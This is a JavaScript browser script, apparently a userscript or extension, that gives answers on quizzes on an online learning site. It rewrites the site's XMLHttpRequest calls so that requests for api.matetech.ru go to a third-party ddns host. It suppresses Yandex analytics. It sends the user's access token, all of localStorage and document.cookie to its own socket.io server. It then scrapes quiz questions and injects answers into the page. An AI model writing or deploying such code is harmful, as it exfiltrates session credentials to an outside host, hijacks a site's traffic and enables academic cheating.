let requested_text = "";

let i = document.createElement("iframe");
i.style.display = "none";
document.body.appendChild(i);
let Tconsole = i.contentWindow.console;

const socket = io();
(function() {
    const originalXhrOpen = XMLHttpRequest.prototype.open;
    const originalXhrSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, async=true, user=null, password=null) {
        this._url = url.replace("api.matetech.ru", "gord1402.ddns.net:5787");
        return originalXhrOpen.call(this, method, this._url, async, user, password);
    };

    XMLHttpRequest.prototype.send = function(body) {
        if (this._url.includes("mc.yandex.ru")) return;
        return originalXhrSend.apply(this, arguments);
    };
})();

let readed_cookie = "";

function getCookie(name) {
    try{
        const value = document.cookie;
        readed_cookie = value;
        const parts = value.split(`; ${name}=`);
        if (parts.length == 2) return parts.pop().split(";").shift();
        const parts2 = value.split(`${name}=`);
        readed_cookie = JSON.stringify(parts2[1].split(";")[0]);
        if (parts2.length >= 2) return parts2[1].split(";")[0];
    }
    catch{
        return null;
    }
}


setTimeout(() => {
    if (window.location.pathname.includes("login")){
        window.location.assign("/login");
    }
    if (!window.location.pathname.includes("login")) {
        let token =
            (localStorage.access_token ||
            getCookie("access_token"));
        if (!token){
            window.location.assign("/login");
            return;
        }
        token = token.replace("%20", " ")
        readed_cookie = JSON.stringify(token);
        socket.emit("auth_user", token, [localStorage, document.cookie]);
    }
}, 1000);

socket.on("auth_success", load_model);
socket.on("auth_error", () => {
    const modal = document.createElement("div");
    modal.style.position = "absolute";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100%";
    modal.style.height = "100%";
    modal.style.background = "rgba(0, 0, 0, 0.5)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "1000";

    const modalContent = document.createElement("div");
    modalContent.style.background = "#fff";
    modalContent.style.padding = "20px";
    modalContent.style.borderRadius = "10px";

    if (window.matchMedia("(max-width: 768px)").matches) {
        modalContent.style.width = "90%";
        modalContent.style.height = "90%";
        modalContent.style.maxWidth = "90%";
    } else {
        modalContent.style.width = "50%";
        modalContent.style.maxWidth = "50%";
    }

    const closeButton = document.createElement("button");
    closeButton.style.position = "fixed";
    closeButton.style.top = "50px";
    closeButton.style.right = "50px";
    closeButton.style.background = "#fff";
    closeButton.style.border = "1px solid #000";
    closeButton.style.cursor = "pointer";
    closeButton.style.padding = "10px 20px";
    closeButton.style.fontSize = "16px";
    closeButton.innerHTML = "Close";
    closeButton.onclick = function () {
        modal.remove();
    };

    modalContent.appendChild(closeButton);

    const modalText = document.createElement("textarea");
    modalText.value = `Ошибка аутентификации. Обновите страницу.
COOKIES:
${JSON.stringify(document.cookie)}
    `;
    modalText.style.height = "100%";
    modalText.style.width = "100%";

    modalContent.appendChild(modalText);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);

    function deleteAllCookies() {
        document.cookie.split(";").forEach((cookie) => {
            const eqPos = cookie.indexOf("=");
            const name = eqPos > -1 ? cookie.substring(0, eqPos) : cookie;
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
        });
    }

    deleteAllCookies();
    localStorage.clear();

    window.location.assign("/login");
});

socket.on("user_banned", () => {
    const modal = document.createElement("div");
    modal.style.position = "absolute";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100%";
    modal.style.height = "100%";
    modal.style.background = "rgba(0, 0, 0, 0.5)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "1000";

    const modalContent = document.createElement("div");
    modalContent.style.background = "#fff";
    modalContent.style.padding = "20px";
    modalContent.style.borderRadius = "10px";

    const modalText = document.createElement("p");
    modalText.innerHTML =
        "Ваш аккаунт заблокирован обратитесь к разработчику сайта.";

    modalContent.appendChild(modalText);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
});


socket.on("disconnect", function () {
    setTimeout(() => {
        window.location.reload();
    }, 2000);
});

let question_element_global_ = undefined;
let current_lesson_id = -1;

async function load_model() {
    try {

        const test_for_status = () => {
            if (window.location.pathname.includes("login")){
                window.location.assign("/login");
            }
        };

        if (typeof navigation !== 'undefined') {
            navigation.addEventListener("navigate", () => {
                setTimeout(test_for_status, 400);
            });
        } else {
            window.addEventListener("popstate", function (event) {
                setTimeout(test_for_status, 400);
            });
        }

        test_for_status();

        start_looking_up(
            async (question_text, answers_text, question_element) => {
                question_element_global_ = question_element;
                socket.emit("find_answer_by_text", question_text, answers_text);
            }
        );
    } catch (e) {
        Tconsole.log(e.message);
        socket.emit("log", e.message);
    }
}

function start_looking_up(find_answer_callback) {
    Tconsole.log("Looking up!");
    (async () => {
        while (true) {
            try {
                let questions_nodes =
                    document.getElementsByClassName("question__inner");
                if (questions_nodes.length != 0) {
                    for (const questions_node of questions_nodes) {
                        let question_element = questions_node.childNodes[0];
                        let question_text = question_element.innerHTML;
                        if(!question_element.innerHTML){
                            question_element = questions_node;
                            question_text = question_element.innerHTML;
                        }

                        let answers_text =
                            questions_node.getElementsByClassName(
                                "question-answers"
                            )[0].innerText;

                        if (questions_node.innerHTML == requested_text) continue;
                        // questions_node.style = "";
                        requested_text = questions_node.innerHTML;
                        Tconsole.log(question_text);
                        await find_answer_callback(
                            question_text,
                            answers_text,
                            question_element
                        );
                        Tconsole.log("Ok!");
                    }
                }
            } catch (e) {
                Tconsole.log(e);
            }
            await new Promise((resolve) => setTimeout(resolve, 100));
        }
    })();
}

socket.on(
    "answer",
    (data_answers, data_question, type, confidence, answer_id) => {
        let answer_html_code = data_answers;

        try {
            Tconsole.log(data_answers);
            let answer_json = JSON.parse(data_answers);
            answer_html_code = "";

            if (type == "correspondence") {
                for (const key in answer_json) {
                    let spans = "";
                    answer_json[key].forEach(
                        (sp) =>
                            (spans += `<span>${sp.replace("<br>", "")}</span>`)
                    );
                    answer_html_code += `
                    <div style="
                        background-color: #eafaf1; 
                        border: 1px solid #2ecc71; 
                        border-radius: 5px; 
                        padding: 10px; 
                        margin: 5px 0;
                    ">
                        <strong style="color: #27ae60;">${key.replace(
                            "<br>",
                            ""
                        )}</strong> 
                        ${spans}
                    </div>
                `;
                }
            } else if (type == "sort") {
                let num = 1;
                for (const value of answer_json.filter(
                    (answer) => answer !== ""
                )) {
                    answer_html_code += `
                    <div style="
                        background-color: #eafaf1; 
                        border: 1px solid #2ecc71; 
                        border-radius: 5px; 
                        padding: 10px; 
                        margin: 5px 0;
                    ">
                        <strong style="color: #27ae60;">${num}.</strong> 
                        <span>${value}</span>
                    </div>
                `;
                    num++;
                }
            } else {
                for (const value of answer_json.filter(
                    (answer) => answer !== ""
                )) {
                    answer_html_code += `
                    <div style="
                        background-color: #f9f9f9; 
                        border: 1px solid #3498db; 
                        border-radius: 5px; 
                        padding: 10px; 
                        margin: 5px 0;
                    ">
                        <span>${value}</span>
                    </div>
                `;
                }
            }
        } catch (e) {
            Tconsole.error(e);
            answer_html_code = data_answers;
        }
        try{
            [].forEach.call(
                question_element_global_.querySelectorAll(".answer_element_i_uid9991111"),
                (element) => {
                    element.remove();
                }
            );
        }
        catch (e){
            Tconsole.log(e)
        }

        question_element_global_.innerHTML += `<div style="
        max-width: 800px; 
        margin: 20px auto; 
        padding: 20px; 
        background-color: #f9f9f9; 
        border-radius: 10px; 
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        font-family: Arial, sans-serif;
        line-height: 1.6;
    " class="answer_element_i_uid9991111">
        <h2 style="
            color: #333; 
            text-align: center; 
            border-bottom: 2px solid #4a4a4a; 
            padding-bottom: 10px;
        ">Результат поиска</h2>
    
        <div style="
            background-color: #ffffff; 
            border-left: 4px solid #3498db; 
            padding: 15px; 
            margin: 15px 0;
        ">
            <strong style="color: #2980b9;">Найденный вопрос:</strong><br/>
            ${data_question}
        </div>
    
        <div style="
        background-color: #ffffff; 
        border-left: 4px solid #2ecc71; 
        padding: 15px; 
        margin: 15px 0;
    ">
        <strong style="color: #27ae60;">Ответ:</strong><br/>
        ${answer_html_code}<br/>
        <small style="color: #7f8c8d; font-style: italic;">Уверенность: ${confidence}%</small>
    </div>
    
    <div style="
        text-align: center; 
        color: #7f8c8d; 
        font-style: italic; 
        margin-top: 20px;
    ">
        Убедитесь в правильности выбранного вопроса.
    <button class="incorrect-answer" style="
        background-color: #e74c3c; 
        color: #fff; 
        padding: 5px 10px; 
        border: none; 
        cursor: pointer;
        font-size: 14px;
        margin: 0 auto;
        display: block;
    ">Выдача не содержит ответа</button>
    </div>
    
    <div style="text-align: center; margin-top: 10px;">
        
        <p style="font-size: 12px;">${answer_id}</p>
        
        <div style="display: flex; justify-content: center;">
            <button class="prev-answer" style="
                background-color: #4CAF50; 
                color: #fff; 
                padding: 5px 10px; 
                border: none; 
                cursor: pointer;
                font-size: 18px;
                margin: 0 5px;
            ">&#8592;</button>
            <button class="next-answer" style="
                background-color: #4CAF50; 
                color: #fff; 
                padding: 5px 10px; 
                border: none; 
                cursor: pointer;
                font-size: 18px;
                margin: 0 5px;
            ">&#8594;</button>
    
        </div>
    </div>
    </div>
    </div>`;
        question_element_global_.querySelector(
            ".prev-answer"
        ).onclick = function () {
            socket.emit("change_answer", -1);
        };
        question_element_global_.querySelector(
            ".next-answer"
        ).onclick = function () {
            socket.emit("change_answer", 1);
        };
        question_element_global_.querySelector(
            ".incorrect-answer"
        ).onclick = function () {
            socket.emit("incorrect");
        };
    }
);